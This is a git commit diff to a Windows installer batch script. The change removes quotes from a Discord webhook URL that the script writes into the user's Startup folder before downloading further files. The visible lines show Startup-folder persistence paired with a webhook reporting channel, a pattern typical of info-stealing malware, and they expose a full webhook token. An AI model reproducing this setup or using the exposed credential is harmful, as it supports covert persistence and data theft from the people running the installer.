48707004a103852a693b51dbd7fafe60753a590d
ReylanTeo <109081015+ReylanTeo@users.noreply.github.com>
2023-10-30 17:11:28 +0800

    Fixed

--- Installer/Installer.cmd
+++ Installer/Installer.cmd
@@ -9,7 +9,7 @@ set "StartupDirectory=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 cd /d "%StartupDirectory%"
 
 @REM Change to your Discord Webhook URL
-echo "https://discord.com/api/webhooks/1167014901038993510/j2oWTYLE3mhwIjTAvOOCh3CauMLSWlzSQCtBoL5UEzTfGasfXSdO4TCtBHSsRbEb6YWD" > DiscordWebhookURL.icu
+echo https://discord.com/api/webhooks/1167014901038993510/j2oWTYLE3mhwIjTAvOOCh3CauMLSWlzSQCtBoL5UEzTfGasfXSdO4TCtBHSsRbEb6YWD > DiscordWebhookURL.icu
 
 @REM Download required files
 
